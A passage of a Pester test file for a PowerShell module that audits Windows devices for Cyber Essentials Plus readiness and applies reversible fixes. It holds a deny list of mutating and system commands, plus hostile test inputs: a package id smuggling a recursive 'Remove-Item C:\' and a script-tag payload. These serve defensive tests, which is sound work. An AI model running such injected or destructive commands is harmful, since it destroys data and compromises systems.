        $deny = @($script:MutatingCommands | Where-Object { $_ -ne 'Invoke-CENative' }) + @(
            'Remove-Item', 'New-Item', 'Set-Content', 'Add-Content', 'Out-File', 'Copy-Item', 'Move-Item', 'Rename-Item',
            'Register-ScheduledTask', 'Unregister-ScheduledTask', 'Set-ScheduledTask', 'Set-CERegistryValueTracked', 'Add-CEUndoCommand',
            'net', 'net.exe', 'auditpol', 'auditpol.exe', 'wevtutil', 'wevtutil.exe', 'secedit', 'secedit.exe', 'reg', 'reg.exe', 'sc', 'sc.exe')
        $problems = foreach ($file in Get-ChildItem (Join-Path $script:srcDir 'Checks') -Filter *.ps1) {
            foreach ($name in (Get-CommandNames $file.FullName)) {
                if ($deny -contains $name) { "$($file.Name) calls $name" }
            }
        }
        @($problems) -join "`n" | Should -BeNullOrEmpty
    }

    It 'checks run native tools only to read' {
        # Invoke-CENative is the one way a check reaches outside PowerShell; every use must be a known query.
        $allowed = @('whoami.exe /groups', 'fltmc.exe filters', 'winget upgrade')
        $problems = foreach ($file in Get-ChildItem (Join-Path $script:srcDir 'Checks') -Filter *.ps1) {
            $ast = [System.Management.Automation.Language.Parser]::ParseFile($file.FullName, [ref]$null, [ref]$null)
            $calls = $ast.FindAll({ $args[0] -is [System.Management.Automation.Language.CommandAst] -and $args[0].GetCommandName() -eq 'Invoke-CENative' }, $true)
            foreach ($call in $calls) {
                $text = $call.Extent.Text -replace '\s+', ' '
                $exe = [regex]::Match($text, '-FilePath (?:''([^'']+)''|\$(\w+))').Groups
                $first = [regex]::Match($text, '-ArgumentList @\(''([^'']+)''').Groups[1].Value
                $key = "$(if ($exe[1].Value) { $exe[1].Value } else { $exe[2].Value }) $first"
                if ($allowed -notcontains $key) { "$($file.Name): $key" }
            }
        }
        @($problems) -join "`n" | Should -BeNullOrEmpty
    }

    It 'front-end scripts only call functions the module exports' {
        # The app runs outside the module: a private function resolves at authoring time (and in this
        # suite, which dot-sources the app) but not at runtime. Everything it calls must be its own,
        # exported from CEAudit.psd1, or a real command.
        $manifest = Import-PowerShellDataFile (Join-Path $script:srcDir 'CEAudit.psd1')
        $exported = @($manifest.FunctionsToExport)
        $modulePrivate = @(Get-ChildItem (Join-Path $script:srcDir 'Private') -Filter *.ps1 | ForEach-Object {
            $ast = [System.Management.Automation.Language.Parser]::ParseFile($_.FullName, [ref]$null, [ref]$null)
            $ast.FindAll({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true) | ForEach-Object Name
        })
        $problems = foreach ($file in Get-ChildItem (Join-Path $script:RepoRoot 'app') -Filter *.ps1) {
            $ast = [System.Management.Automation.Language.Parser]::ParseFile($file.FullName, [ref]$null, [ref]$null)
            $own = @($ast.FindAll({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true) | ForEach-Object Name)
            foreach ($name in (Get-CommandNames $file.FullName)) {
                if ($own -contains $name -or $exported -contains $name) { continue }
                if ($modulePrivate -contains $name) { "$($file.Name) calls private module function $name"; continue }
            }
        }
        @($problems) -join "`n" | Should -BeNullOrEmpty
    }

    It 'no script or function assigns to its own parameter under a differently cased name' {
        # Variable names ignore case, so a $summary in a script with a [string]$Summary parameter is that
        # parameter, and its type joins any array assigned to it into one string. A different case says
        # the author meant a variable of their own.
        $roots = @('src', 'app', 'intune', 'tools') | ForEach-Object { Join-Path $script:RepoRoot $_ }
        $files = @(Get-ChildItem -LiteralPath $roots -Recurse -File | Where-Object { $_.Extension -in '.ps1', '.psm1' })
        $problems = foreach ($file in $files) {
            $ast = [System.Management.Automation.Language.Parser]::ParseFile($file.FullName, [ref]$null, [ref]$null)
            $scopes = @($ast) + @($ast.FindAll({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true) | ForEach-Object { $_.Body })
            foreach ($scope in $scopes) {
                $params = @()
                if ($scope.ParamBlock) { $params += @($scope.ParamBlock.Parameters | ForEach-Object { $_.Name.VariablePath.UserPath }) }
                if ($scope.Parent -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $scope.Parent.Parameters) {
                    $params += @($scope.Parent.Parameters | ForEach-Object { $_.Name.VariablePath.UserPath })
                }
                if (-not $params.Count) { continue }
                $vars = $scope.FindAll({ $args[0] -is [System.Management.Automation.Language.VariableExpressionAst] }, $true)
                foreach ($v in $vars) {
                    $name = $v.VariablePath.UserPath
                    if (-not @($params | Where-Object { $_ -ieq $name -and $_ -cne $name }).Count) { continue }
                    # A nested function is a scope of its own, checked against its own parameters.
                    $owner = $v.Parent
                    while ($owner -ne $scope -and $owner -isnot [System.Management.Automation.Language.FunctionDefinitionAst]) { $owner = $owner.Parent }
                    if ($owner -ne $scope) { continue }
                    $target = if ($v.Parent -is [System.Management.Automation.Language.ConvertExpressionAst]) { $v.Parent } else { $v }
                    $set = ($target.Parent -is [System.Management.Automation.Language.AssignmentStatementAst] -and $target.Parent.Left -eq $target) -or
                    ($v.Parent -is [System.Management.Automation.Language.ForEachStatementAst] -and $v.Parent.Variable -eq $v)
                    if ($set) { '{0}:{1} assigns ${2}' -f $file.Name, $v.Extent.StartLineNumber, $name }
                }
            }
        }
        @($problems) -join "`n" | Should -BeNullOrEmpty
    }

    It 'the installer and the module lock a data folder with the identical descriptor (no drift)' {
        # The installer can't import the module, so it carries its own copy of the locked-descriptor
        # builder, like Get-CEStatusTrustProblem. This keeps the two copies from drifting apart.
        $ast = [System.Management.Automation.Language.Parser]::ParseFile((Join-Path (Join-Path $script:RepoRoot 'intune') 'Install-CEChecker.ps1'), [ref]$null, [ref]$null)
        $fn = $ast.Find({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $args[0].Name -eq 'New-CEDataDirectorySecurity' }, $true)
        $fn | Should -Not -BeNullOrEmpty
        . ([scriptblock]::Create($fn.Extent.Text))
        foreach ($usersRead in $false, $true) {
            $installerSddl = (New-CEDataDirectorySecurity -UsersRead:$usersRead).GetSecurityDescriptorSddlForm([Security.AccessControl.AccessControlSections]::Access)
            $moduleSddl = InModuleScope CEAudit -Parameters @{ U = $usersRead } { param($U) (New-CELockedDirectorySecurity -UsersRead:$U).GetSecurityDescriptorSddlForm([Security.AccessControl.AccessControlSections]::Access) }
            $installerSddl | Should -Be $moduleSddl -Because "the two copies must lock a folder identically (UsersRead=$usersRead)"
            $installerSddl | Should -Match '^D:P\(A;OICI;FA;;;SY\)\(A;OICI;FA;;;BA\)' -Because 'protected, SYSTEM and Administrators only'
        }
    }
}

Describe 'Parsers' {
    It 'parses net accounts output' {
        InModuleScope CEAudit {
            Mock Invoke-CENative {
                [pscustomobject]@{ ExitCode = 0; Output = @(
                    'Force user logoff how long after time expires?:       Never',
                    'Minimum password age (days):                          0',
                    'Maximum password age (days):                          Unlimited',
                    'Minimum password length:                              12',
                    'Length of password history maintained:                None',
                    'Lockout threshold:                                    10',
                    'Lockout duration (minutes):                           10',
                    'Lockout observation window (minutes):                 10',
                    'Computer role:                                        WORKSTATION',
                    'The command completed successfully.') }
            }
            $p = Get-CEAccountPolicy
            $p.MinPasswordLength | Should -Be 12
            $p.MaxPasswordAgeDays | Should -Be -1
            $p.LockoutThreshold | Should -Be 10
            $p.LockoutWindowMinutes | Should -Be 10
        }
    }

    It 'treats a "Never" lockout threshold as 0' {
        InModuleScope CEAudit {
            Mock Invoke-CENative {
                [pscustomobject]@{ ExitCode = 0; Output = @('a: Never', 'b: 0', 'c: 42', 'd: 0', 'e: None', 'f: Never', 'g: 30', 'h: 30', 'i: WORKSTATION') }
            }
            (Get-CEAccountPolicy).LockoutThreshold | Should -Be 0
        }
    }

    It 'parses winget upgrade tables' {
        InModuleScope CEAudit {
            $cr = [char]13
            $ell = [char]0x2026
            $lines = @(
                ("   - $cr   \ $cr   | $cr" + (' ' * 80) + "${cr}Name                               Id                          Version        Available      Source"),
                ('-' * 119),
                '7-Zip 23.01 (x64)                  7zip.7zip                   23.01          25.01          winget',
                'Microsoft Visual Studio Code (User) Microsoft.VisualStudioCode 1.100.0        1.104.0        winget',
                "Some Very Long Application Name    Contoso.SomeVeryLongApp$ell    1.0            2.0            winget",
                '3 upgrades available.',
                '',
                'The following packages have an upgrade available, but require explicit targeting for upgrade:',
                'Name                                         Id                                    Version   Available Source',
                ('-' * 109),
                'Discord                                      Discord.Discord                       1.0.9163  1.0.9200  winget',
                "1 package(s) have pins that prevent upgrade. Use the 'winget pin' command to view and edit pins."
            )
            $rows = @(ConvertFrom-CEWingetTable -Lines $lines)
            ($rows | ForEach-Object { $_.Id }) -join ',' | Should -Be "7zip.7zip,Microsoft.VisualStudioCode,Contoso.SomeVeryLongApp$ell,Discord.Discord"
            $rows[0].Available | Should -Be '25.01'
            $rows[1].Name | Should -Be 'Microsoft Visual Studio Code (User)'
            $rows[2].Truncated | Should -BeTrue
            $rows[3].Version | Should -Be '1.0.9163'
            @($rows | Where-Object { $_.Name -match '^(Name|-+)' -or $_.Id -match '^-+$' }).Count | Should -Be 0
        }
    }

    It 'offers no automatic fix for a winget id that was shortened' {
        Set-TestDevice -Kind Insecure
        Mock -ModuleName CEAudit Get-CEWingetUpgrades {
            [pscustomobject]@{ Available = $true; Packages = @([pscustomobject]@{ Name = 'Long App'; Id = "Contoso.Lo$([char]0x2026)"; Version = '1'; Available = '2'; Source = 'winget'; Truncated = $true }) }
        }
        $f = @(Invoke-CEAuditCore -Id 'SU-05')
        $f[0].Status | Should -Be 'Fail'
        $f[0].Remediation | Should -BeNullOrEmpty
    }

    It 'returns nothing for "No installed package found"' {
        InModuleScope CEAudit {
            @(ConvertFrom-CEWingetTable -Lines @('No installed package found matching input criteria.')).Count | Should -Be 0
        }
    }
}

Describe 'Audit of an insecure device' {
    BeforeAll {
        Set-TestDevice -Kind Insecure
        $script:findings = @(Invoke-CEAuditCore)
        $script:byId = @{}
        foreach ($f in $script:findings) { $script:byId[$f.FindingId] = $f }
    }

    It 'produces no Error findings (every check handled its inputs)' {
        $errors = @($script:findings | Where-Object Status -eq 'Error')
        ($errors | ForEach-Object { "$($_.FindingId): $($_.Actual)" }) -join "`n" | Should -BeNullOrEmpty
    }

    It 'fails the firewall, autorun, lockout and PIN checks' {
        $script:byId['FW-01'].Status | Should -Be 'Fail'
        $script:byId['FW-02'].Status | Should -Be 'Fail'
        $script:byId['SC-05'].Status | Should -Be 'Fail'
        $script:byId['SC-07'].Status | Should -Be 'Fail'
        $script:byId['SC-08'].Status | Should -Be 'Fail'
    }

    It 'flags the risky public inbound rule and RDP without NLA' {
        $script:byId['FW-03:Old-game-server'].Status | Should -Be 'Warn'
        $script:byId['FW-04:NLA'].Status | Should -Be 'Fail'
    }

    It 'flags account problems' {
        $script:byId['SC-01'].Status | Should -Be 'Fail'
        $script:byId['SC-02'].Status | Should -Be 'Fail'
        $script:byId['SC-03:olduser'].Status | Should -Be 'Warn'
        $script:byId['SC-04:olduser'].Status | Should -Be 'Fail'
    }

    It 'detects the everyday account is an admin when elevated as the same user' {
        Set-TestDevice -Kind Insecure -ContextOverride @{ RunningAs = 'TESTPC\paul'; ConsoleUser = 'TESTPC\paul' }
        $f = @(Invoke-CEAuditCore -Id 'UA-01')[0]
        $f.Status | Should -Be 'Fail'
    }

    It 'detects a split-token admin when not elevated' {
        Set-TestDevice -Kind Insecure -ContextOverride @{ IsElevated = $false; RunningAs = 'TESTPC\paul' }
        $f = @(Invoke-CEAuditCore -Id 'UA-01')[0]
        $f.Status | Should -Be 'Fail'
        Set-TestDevice -Kind Insecure
    }

    It 'raises the auto-fail patching and app update findings' {
        $script:byId['SU-03:Overdue'].Status | Should -Be 'Fail'
        $script:byId['SU-03:Overdue'].AutoFail | Should -BeTrue
        $script:byId['SU-05:7zip-7zip'].Status | Should -Be 'Fail'
        $script:byId['SU-05:7zip-7zip'].AutoFail | Should -BeTrue
    }

    It 'flags end-of-life software' {
        $f = $script:findings | Where-Object { $_.CheckId -eq 'SU-06' -and $_.Subject -like 'Python 3.8*' }
        $f.Status | Should -Be 'Fail'
    }

    It 'flags disabled automatic updates and blocked Chrome updates' {
        $script:byId['SU-02:Automatic-updates'].Status | Should -Be 'Fail'
        $script:byId['SU-07:Google-Chrome'].Status | Should -Be 'Fail'
    }

    It 'flags malware protection gaps' {
        $script:byId['MP-01'].Status | Should -Be 'Fail'
        $script:byId['MP-02'].Status | Should -Be 'Fail'
        $script:byId['MP-03'].Status | Should -Be 'Fail'
        $script:byId['MP-05:Network-protection'].Status | Should -Be 'Fail'
        $script:byId['MP-10:Path-C'].Status | Should -Be 'Fail'
        $script:byId['MP-10:Extension-exe'].Status | Should -Be 'Fail'
        $script:findings | Where-Object { $_.FindingId -like 'MP-10:Path-C-Tools*' } | Should -BeNullOrEmpty
    }

    It 'marks MFA as needing attestation for detected cloud services' {
        $f = $script:findings | Where-Object { $_.CheckId -eq 'UA-07' -and $_.Subject -like 'Microsoft 365*' }
        $f.Status | Should -Be 'Manual'
    }

    It 'warns that Windows 11 24H2 Pro is close to end of servicing' {
        Set-TestDevice -Kind Insecure -ContextOverride @{ Build = 26100; DisplayVersion = '24H2' }
        Mock -ModuleName CEAudit Get-Date { [datetime]'2026-09-16' } -ParameterFilter { -not $Date -and -not $Format }
        $f = @(Invoke-CEAuditCore -Id 'SU-01') | Where-Object { -not $_.Subject }
        $f.Status | Should -Be 'Warn'
        $f.Actual | Should -Match '2026-10-13'
        Set-TestDevice -Kind Insecure
    }

    It 'fails Windows 10' {
        Set-TestDevice -Kind Insecure -ContextOverride @{ OSFamily = 'Windows 10'; Build = 19045 }
        $f = @(Invoke-CEAuditCore -Id 'SU-01') | Where-Object { -not $_.Subject }
        $f.Status | Should -Be 'Fail'
        $f.AutoFail | Should -BeTrue
        Set-TestDevice -Kind Insecure
    }

    It 'skips admin-only checks when not elevated' {
        Set-TestDevice -Kind Insecure -ContextOverride @{ IsElevated = $false }
        $f = @(Invoke-CEAuditCore -Id 'NC-01')[0]
        $f.Status | Should -Be 'Skipped'
        Set-TestDevice -Kind Insecure
    }

    It 'turns an exception inside a check into an Error finding' {
        Mock -ModuleName CEAudit Get-NetFirewallProfile { throw 'boom' }
        $f = @(Invoke-CEAuditCore -Id 'FW-01')[0]
        $f.Status | Should -Be 'Error'
        $f.Actual | Should -Match 'boom'
        Set-TestDevice -Kind Insecure
    }

    Context 'changeset' {
        BeforeAll {
            $script:cs = New-CEChangeset -Findings $script:findings -Context (New-TestContext)
        }

        It 'creates sequential item ids' {
            $script:cs.Items.Count | Should -BeGreaterThan 10
            $script:cs.Items[0].ItemId | Should -Be 'C001'
            ($script:cs.Items.ItemId | Sort-Object -Unique).Count | Should -Be $script:cs.Items.Count
        }

        It 'puts auto-fail fixes first' {
            $script:cs.Items[0].AutoFail | Should -BeTrue
            $firstNonAuto = [array]::IndexOf(@($script:cs.Items.AutoFail), $false)
            @($script:cs.Items | Select-Object -Skip $firstNonAuto | Where-Object AutoFail).Count | Should -Be 0
        }

        It 'merges findings that share a remediation' {
            $wu = @($script:cs.Items | Where-Object { $_.RemediationId -eq 'WindowsUpdate-InstallSecurity' })
            $wu.Count | Should -Be 1
        }

        It 'does not pre-select high-risk items' {
            $script:cs.Items | Where-Object Risk -eq 'High' | ForEach-Object { $_.Selected | Should -BeFalse }
        }

        It 'lists findings without automated fixes as manual actions' {
            $script:cs.ManualActions.FindingId | Should -Contain 'SC-09'
            $script:cs.ManualActions.FindingId | Should -Contain 'SU-06:Python-3-8-10-64-bit'
        }

        It 'round-trips through JSON' {
            $json = $script:cs | ConvertTo-Json -Depth 8
            $back = $json | ConvertFrom-Json
            $back.Items.Count | Should -Be $script:cs.Items.Count
            $back.SchemaVersion | Should -Be 1
        }
    }

    Context 'reports' {
        It 'writes json, markdown and html' {
            $out = Join-Path $TestDrive 'out'
            $r = Export-CEReport -Findings $script:findings -Context (New-TestContext) -OutputPath $out
            foreach ($p in $r.Paths.PSObject.Properties.Value) { Test-Path $p | Should -BeTrue }
            $r.Summary.Verdict | Should -Match '^FAIL'
            $fw = @($script:findings | Where-Object Category -eq 'Firewalls')
            $p = Export-CEReport -Findings $fw -Context (New-TestContext) -OutputPath (Join-Path $TestDrive 'out-partial') -PartialRun
            $p.Summary.Verdict | Should -Match '^PARTIAL: \d+ of 57 checks run$' -Because 'a partial run gives no FAIL/READY verdict even with failures'
            (Get-Content $r.Paths.Html -Raw) | Should -Match 'Cyber Essentials Plus readiness'
            (Get-Content $r.Paths.Markdown -Raw) | Should -Match 'Automatic-fail items'
            ($r.Summary.CEPlus | Where-Object TestCase -eq 'TC2').State | Should -Be 'Likely fail'
            ($r.Summary.CEPlus | Where-Object TestCase -eq 'TC5').State | Should -Be 'Likely fail'
        }

        It 'HTML-encodes finding text' {
            $f = @($script:findings)[0].PSObject.Copy()
            $f.Actual = '<script>alert(1)</script>'
            $out = Join-Path $TestDrive 'enc'
            $r = Export-CEReport -Findings @($f) -Context (New-TestContext) -OutputPath $out
            (Get-Content $r.Paths.Html -Raw) | Should -Not -Match '<script>alert'
        }
    }
}

Describe 'Audit of a hardened device' {
    BeforeAll {
        Set-TestDevice -Kind Secure
        $script:findings = @(Invoke-CEAuditCore)
    }

    It 'has no failures or errors' {
        $bad = @($script:findings | Where-Object { @('Fail', 'Error') -contains $_.Status })
        ($bad | ForEach-Object { "$($_.FindingId) [$($_.Status)] $($_.Actual)" }) -join "`n" | Should -BeNullOrEmpty
    }

    It 'does not claim READY for a partial run' {
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        $summary = InModuleScope CEAudit -Parameters @{ F = $f } { param($F) Get-CESummary -Findings $F -PartialRun }
        $summary.Verdict | Should -Be 'PARTIAL: 1 of 57 checks run'
        $summary.PartialRun | Should -BeTrue
        $out = Join-Path $TestDrive 'partial'
        $r = Export-CEReport -Findings $f -Context (New-TestContext) -OutputPath $out -PartialRun
        $r.Summary.Verdict | Should -Be 'PARTIAL: 1 of 57 checks run'
        (Get-Content $r.Paths.Html -Raw) | Should -Match ([regex]::Escape("<div class='msg'>PARTIAL: 1 of 57 checks run</div>"))
        (Get-Content $r.Paths.Markdown -Raw) | Should -Match ([regex]::Escape('## PARTIAL: 1 of 57 checks run'))
        # A check can run without leaving a finding, so the engine's count wins over the findings.
        $progress = @{}
        $f = @(Invoke-CEAuditCore -Id 'NC-08', 'NC-07' -ProgressState $progress)
        $progress.Done | Should -Be 2
        $r = Export-CEReport -Findings @($f | Where-Object CheckId -eq 'NC-08') -Context (New-TestContext) -OutputPath $out -PartialRun -ChecksRun $progress.Done
        $r.Summary.Verdict | Should -Be 'PARTIAL: 2 of 57 checks run'
    }

    It 'still asks for manual attestation (MFA, software review, backups)' {
        $summary = InModuleScope CEAudit -Parameters @{ F = $script:findings } { param($F) Get-CESummary -Findings $F }
        $summary.Verdict | Should -Match '^NEEDS REVIEW'
    }

    It 'passes once MFA is attested' {
        InModuleScope CEAudit {
            $cfg = Get-CEConfig
            $orig = $cfg.'cloud-services'
            try {
                $cfg.'cloud-services' = [pscustomobject]@{
                    maxAttestationAgeDays = 365
                    services = @([pscustomobject]@{ name = 'Microsoft 365 / Entra ID'; mfaEnforced = $true; adminMfaEnforced = $true; verifiedOn = (Get-Date).ToString('yyyy-MM-dd'); verifiedBy = 'IT admin' })
                    detectionHints = $orig.detectionHints
                }
                $f = @(Invoke-CEAuditCore -Id 'UA-07')
                $f.Status | Should -Be 'Pass'
            }
            finally { $cfg.'cloud-services' = $orig }
        }
    }

    It 'fails when a service is attested without MFA' {
        InModuleScope CEAudit {
            $cfg = Get-CEConfig
            $orig = $cfg.'cloud-services'
            try {
                $cfg.'cloud-services' = [pscustomobject]@{
                    maxAttestationAgeDays = 365
                    services = @([pscustomobject]@{ name = 'Xero'; mfaEnforced = $false; adminMfaEnforced = $false; verifiedOn = '2026-09-01'; verifiedBy = 'IT admin' })
                    detectionHints = @()
                }
                $f = @(Invoke-CEAuditCore -Id 'UA-07')
                $f.Status | Should -Be 'Fail'
                $f.AutoFail | Should -BeTrue
            }
            finally { $cfg.'cloud-services' = $orig }
        }
    }
}

Describe 'Remediation engine' {
    BeforeAll { Set-TestDevice -Kind Insecure }

    It 'refuses unknown remediation ids' {
        { Invoke-CERemediation -Id 'Evil-Thing' -Parameters @{} } | Should -Throw '*Unknown remediation*'
    }

    It 'rejects injected winget package ids' {
        { Invoke-CERemediation -Id 'Winget-Upgrade' -Parameters @{ PackageId = 'foo; Remove-Item C:\ -Recurse' } } | Should -Throw '*not allowed*'
    }

    It 'rejects optional features outside the allow list' {
        { Invoke-CERemediation -Id 'OptionalFeature-Disable' -Parameters @{ FeatureName = 'Microsoft-Hyper-V' } } | Should -Throw '*not one of*'
    }

    It 'rejects out-of-range lockout thresholds' {
        { Invoke-CERemediation -Id 'AccountLockout-Set' -Parameters @{ Threshold = 50; DurationMinutes = 10; WindowMinutes = 10 } } | Should -Throw '*outside*'
    }

    It 'rejects ASR rule ids that are not in config' {
        { Invoke-CERemediation -Id 'Defender-ASR' -Parameters @{ Mode = 'Block'; RuleIds = @('00000000-0000-0000-0000-000000000000') } } | Should -Throw
    }

    It 'requires elevation for machine changes' {
        Set-TestDevice -Kind Insecure -ContextOverride @{ IsElevated = $false }
        { Invoke-CERemediation -Id 'Autorun-Disable' } | Should -Throw '*elevated*'
        Set-TestDevice -Kind Insecure
    }

    It 'does nothing under -WhatIf' {
        Mock -ModuleName CEAudit Set-CERegistryValueTracked { throw 'should not be called' }
        $r = Invoke-CERemediation -Id 'Autorun-Disable' -WhatIf
        $r.Status | Should -Be 'WhatIf'
    }

    It 'records registry undo information' {
        InModuleScope CEAudit {
            Mock Get-CERegistryState { @{ Path = $Path; Name = $Name; Existed = $true; Value = 0; Kind = 'DWord' } }
            Mock Test-Path { $true }
            Mock New-ItemProperty { }
            $undo = New-Object System.Collections.Generic.List[object]
            Set-CERegistryValueTracked -Path 'HKLM:\X' -Name 'Y' -Value 1 -Undo $undo
            $undo.Count | Should -Be 1
            $undo[0].Existed | Should -BeTrue
            $undo[0].Value | Should -Be 0
            Should -Invoke New-ItemProperty -Times 1
        }
    }

    It 'skips registry writes that are already in the desired state' {
        InModuleScope CEAudit {
            Mock Get-CERegistryState { @{ Path = $Path; Name = $Name; Existed = $true; Value = 1; Kind = 'DWord' } }
            Mock New-ItemProperty { }
            $undo = New-Object System.Collections.Generic.List[object]
            Set-CERegistryValueTracked -Path 'HKLM:\X' -Name 'Y' -Value 1 -Undo $undo
            $undo.Count | Should -Be 0
            Should -Invoke New-ItemProperty -Times 0
        }
    }

    It 'applies a hardening remediation and returns its undo records' {
        InModuleScope CEAudit {
            Mock Get-CERegistryState { @{ Path = $Path; Name = $Name; Existed = $false; Value = $null; Kind = $null } }
            Mock Test-Path { $true }
            Mock New-ItemProperty { }
            $r = Invoke-CERemediation -Id 'Hardening-RestrictAnonymous'
            $r.Status | Should -Be 'Applied'
            @($r.Undo).Count | Should -Be 2
            $r.RequiresReboot | Should -BeTrue
        }
    }

    It 'warns that script block logging writes to a log signed-in users can read' {
        $notes = (Get-CERemediation -Id 'Hardening-CommandLineLogging').Notes
        $notes | Should -Match 'script blocks go to Microsoft-Windows-PowerShell/Operational, which signed-in users can read'
    }

    It 'quotes undo command literals safely' {
        InModuleScope CEAudit {
            ConvertTo-CEPSLiteral "it's; Remove-Item x" | Should -Be "'it''s; Remove-Item x'"
            ConvertTo-CEPSLiteral 5 | Should -Be '5'
            ConvertTo-CEPSLiteral $true | Should -Be '$true'
        }
    }

    It 'refuses to disable the built-in admin when it is the only admin' {
        InModuleScope CEAudit {
            Mock Get-LocalUser { [pscustomobject]@{ Name = 'Administrator'; SID = 'S-1-5-21-1-500'; Enabled = $true } }
            Mock Get-LocalGroupMember { [pscustomobject]@{ Name = 'PC\Administrator'; SID = 'S-1-5-21-1-500'; PrincipalSource = 'Local' } }
            Mock Disable-LocalUser { }
            $r = Invoke-CERemediation -Id 'LocalUser-DisableBySidSuffix' -Parameters @{ SidSuffix = 500 }
            $r.Status | Should -Be 'Failed'
            $r.Message | Should -Match 'no other enabled administrator'
            Should -Invoke Disable-LocalUser -Times 0
        }
    }
}

Describe 'Applying a changeset' {
    BeforeAll { Set-TestDevice -Kind Insecure }

    It 'skips admin-only items when not elevated and writes no undo log' {
        Set-TestDevice -Kind Insecure -ContextOverride @{ IsElevated = $false }
        $cs = Join-Path $TestDrive 'changeset.json'
        '{}' | Set-Content $cs
        $items = @([pscustomobject]@{ ItemId = 'C001'; Title = 'Autorun'; RemediationId = 'Autorun-Disable'; Parameters = @{}; RequiresAdmin = $true; RequiresReboot = $false; CheckIds = @('SC-05') })
        $r = Invoke-CEChangeset -Items $items -ChangesetPath $cs
        $r.Skipped | Should -Be 1
        $r.Applied | Should -Be 0
        $r.UndoPath | Should -BeNullOrEmpty
        Set-TestDevice -Kind Insecure
    }

    It 'applies items, writes an undo log and re-runs the related checks' {
        Mock -ModuleName CEAudit Get-CERegistryState { @{ Path = $Path; Name = $Name; Existed = $false; Value = $null; Kind = $null } }
        Mock -ModuleName CEAudit Test-Path { $true }
        Mock -ModuleName CEAudit New-ItemProperty { }
        $cs = Join-Path $TestDrive 'changeset.json'
        '{}' | Set-Content $cs
        $items = @([pscustomobject]@{ ItemId = 'C001'; Title = 'Autorun'; RemediationId = 'Autorun-Disable'; Parameters = @{}; RequiresAdmin = $true; RequiresReboot = $false; CheckIds = @('SC-05') })
        $r = Invoke-CEChangeset -Items $items -ChangesetPath $cs
        $r.Applied | Should -Be 1
        Test-Path $r.UndoPath | Should -BeTrue
        $log = Get-Content $r.UndoPath -Raw | ConvertFrom-Json
        @($log.Items[0].Undo).Count | Should -Be 3
        @($r.Verification).CheckId | Should -Contain 'SC-05'
        # @() matters: one result is a single object, which has no .Count in Windows PowerShell 5.1.
        @(Get-CEUndoLogs -OutputRoot $TestDrive).Count | Should -BeGreaterThan 0
    }

    It 'makes no changes and writes no log under -WhatIf' {
        Mock -ModuleName CEAudit New-ItemProperty { throw 'should not write' }
        $cs = Join-Path (Join-Path $TestDrive 'wi') 'changeset.json'
        New-Item -ItemType Directory -Path (Split-Path $cs) -Force | Out-Null
        '{}' | Set-Content $cs
        $items = @([pscustomobject]@{ ItemId = 'C001'; Title = 'Autorun'; RemediationId = 'Autorun-Disable'; Parameters = @{}; RequiresAdmin = $true; RequiresReboot = $false; CheckIds = @('SC-05') })
        $r = Invoke-CEChangeset -Items $items -ChangesetPath $cs -WhatIf
        $r.WhatIf | Should -BeTrue
        $r.UndoPath | Should -BeNullOrEmpty
        @(Get-ChildItem (Split-Path $cs) -Filter 'undo-*').Count | Should -Be 0
    }
}

Describe 'Desktop app result rendering' {
    # WPF isn't available everywhere, so load the app's functions and render
    # into stand-in controls. Catches PowerShell pitfalls in the UI code, such
    # as empty DataTables being unrolled to $null on return.
    BeforeAll {
        Set-TestDevice -Kind Insecure
        $f = @(Invoke-CEAuditCore)
        $script:guiOut = Join-Path $TestDrive 'gui'
        $rep = Export-CEReport -Findings $f -Context $global:CETestCtx -OutputPath $script:guiOut
        $script:guiResult = [pscustomobject]@{ Findings = $f; Context = $global:CETestCtx; Summary = $rep.Summary; Changeset = $rep.Changeset; Folder = $script:guiOut; Paths = $rep.Paths }

        $src = Get-Content (Join-Path $script:RepoRoot 'app\Start-CEAuditGui.ps1') -Raw
        $ast = [System.Management.Automation.Language.Parser]::ParseInput($src, [ref]$null, [ref]$null)
        $script:guiFunctions = @($ast.FindAll({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $false) | ForEach-Object { $_.Extent.Text })
    }

    It 'renders fresh and saved results without errors' {
        foreach ($fn in $script:guiFunctions) { . ([scriptblock]::Create($fn)) }
        function Get-Brush { 'brush' }
        function New-Tile { 'tile' }
        function New-CEFrameworkBar { param($Label, $Fraction, $Percent, $Deviation) 'bar' }
        function New-CEAiLine { param([string]$Text, [switch]$Bad) if ($Bad) { "BAD: $Text" } else { $Text } }
        function Set-CEStatusStack { param($CheckMap) }
        function New-CELegendItem { param([string]$Colour, [string]$Text) 'legend' }
        function Set-UiRichText { param($Block, [object[]]$Parts) $Block.Text = (@($Parts | ForEach-Object { $_['Text'] }) -join '') }
        function Set-UiTabHeader { param($Tab, [string]$Label, $Count) $Tab.Header = "$Label $Count" }
        function Set-UiTabsEnabled { param([bool]$On) }
        function Get-CEAiPosture { param($Context) [ordered]@{ agentsFound = 1; contained = $true; deviations = 0; agents = @([ordered]@{ name = 'Test agent'; elevated = $false; asSystem = $false; running = $true }); environments = @([ordered]@{ type = 'wsl'; name = 'Debian'; wslVersion = 2; defaultUidRoot = $false; autoMount = $true; networking = 'nat' }) } }
        # Read by the app functions via dynamic scope.
        Set-Variable -Name statusOrder -Value @('Pass', 'Fail', 'Warn', 'Manual', 'Skipped', 'NotApplicable', 'Error')
        Set-Variable -Name themeLabels -Value ([ordered]@{ Firewalls = 'Firewalls'; SecureConfiguration = 'Secure configuration'; SecurityUpdateManagement = 'Security update management'; UserAccessControl = 'User access control'; MalwareProtection = 'Malware protection'; NCSCHardening = 'NCSC hardening (beyond CE)' })
        $script:OutputRoot = $TestDrive
        $script:FindingScope = $null
        $ui = @{}
        foreach ($n in 'VerdictBanner', 'VerdictText', 'VerdictSub', 'TcGrid', 'ThemeGrid', 'FindingsGrid', 'ChangesGrid', 'ManualGrid', 'HistoryGrid', 'ChangesTab', 'ManualTab', 'HistoryTab', 'OpenReportBtn', 'OpenFolderBtn', 'FindingCount', 'SelCount') {
            $ui[$n] = [pscustomobject]@{ BorderBrush = $null; Text = ''; Foreground = $null; ItemsSource = $null; Header = ''; IsEnabled = $false }
        }
        $ui.Tiles = [pscustomobject]@{ Children = (New-Object System.Collections.ArrayList) }
        $ui.FwBars = [pscustomobject]@{ Children = (New-Object System.Collections.ArrayList) }
